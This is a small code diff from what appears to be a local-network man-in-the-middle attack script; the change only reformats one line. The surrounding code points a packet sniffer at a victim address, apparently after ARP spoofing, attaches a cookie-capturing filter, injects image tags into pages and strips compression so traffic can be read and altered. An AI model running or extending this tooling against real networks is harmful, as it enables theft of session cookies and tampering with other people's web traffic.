@@ -19,7 +19,8 @@ mapping = IpToMacMapper().set_all({
 packet_sniffer = PacketSniffer(['192.168.56.103'], mapping, 'enp0s3')
 packet_sniffer.packet_filter.attach(CookieFilter())
 packet_sniffer.packet_injectors.append(ImgTagInjector())
-packet_sniffer.packet_injectors.append(AcceptEncodingSubstituter()) # Prevent the pages from being served with compression
+packet_sniffer.packet_injectors.append(
+    AcceptEncodingSubstituter())  # Prevent the pages from being served with compression
 packet_sniffer.start()
 
 arp.join()
